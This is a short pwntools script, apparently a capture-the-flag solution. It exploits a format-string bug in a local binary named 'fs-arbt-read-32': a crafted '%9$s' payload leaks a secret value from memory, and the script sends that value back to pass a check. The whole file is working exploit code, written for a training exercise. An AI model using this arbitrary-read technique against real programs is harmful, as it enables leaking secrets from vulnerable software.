from pwn import *

p = process("fs-arbt-read-32")

addr_random_value = p.elf.symbols['random_value']
print('rand value:')
print(hex(addr_random_value))

print(p.recv())

buf = "%9$sAAAA" + p64(addr_random_value)
p.sendline(buf)
data = p.recv()
print(repr(data))
#value = (data).split('\n')[0].split(' ')[1].split('`')[0]
#print(value)
value = data.split(' ')[1].split('A')[0]
value = u32(value)
print(hex(value))
p.sendline(hex(value))
p.interactive()

